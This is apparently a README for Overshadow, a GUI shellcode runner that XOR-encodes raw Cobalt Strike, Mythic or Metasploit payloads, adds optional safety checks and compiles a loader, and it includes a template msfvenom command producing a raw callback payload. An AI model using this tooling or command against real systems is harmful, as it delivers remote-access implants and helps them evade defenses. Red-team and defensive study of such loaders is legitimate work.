## Overshadow

# What is Overshadow?

Overshadow is a shellcode runner for use with Cobalt Strike, Mythic, or Metasploit. At its core, Overshadow utilizes ScatterBrain to configure the original binary for use. There are a number of safety checks that can be enabled/disabled as needed, as well as three different execution methods. 

It's worth noting that by default all of the SafetyChecks are disabled and the execution method is not configured. 

# How do I use it?

First you're going to need to generate a payload in the "Raw" format. Export that .bin file to where you have Overshadow and either drop it in the Assets/Files folder, or upload it via the options within the program. From there you can choose to add key for the XOR (By default this is set to SOUR.), pick specific safety checks, and choose an execution method. After that, all that's left is to compile and save your payload where you want and to run. 

	1) Generate Raw Payload
	2) Add custom XOR Key (Optional)
	3) Compile and save

# Meterpreter sample command for raw payload

```msfvenom -p <payload> lhost=<lhost> lport=<lport> -f raw > payload.bin```

This is my first attempt at making a GUI, so feel free to leave feedback on what can be improved. Enjoy!

![Home](Overshadow/Assets/Images/Home.PNG)
